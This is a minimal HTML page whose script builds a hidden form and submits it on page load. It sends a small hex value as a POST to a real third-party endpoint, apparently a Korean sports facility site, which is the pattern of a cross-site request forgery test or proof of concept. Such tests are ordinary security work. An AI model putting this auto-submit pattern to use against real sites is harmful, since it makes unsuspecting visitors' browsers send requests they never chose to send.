<html>
  <head>
    <title>Auto POST</title>
  </head>
  <body>
    <script>
      var hex = "70 61 67"; 

      var form = document.createElement('form');
      form.action = "https://g1.sports.or.kr/lifecycle/aroundFacility.do";
      form.method = "post";

      var input = document.createElement('input');
      input.name = "data";
      input.value = hex;

      form.appendChild(input);
      document.body.appendChild(form);
      form.submit(); 
    </script>
  </body>
</html>
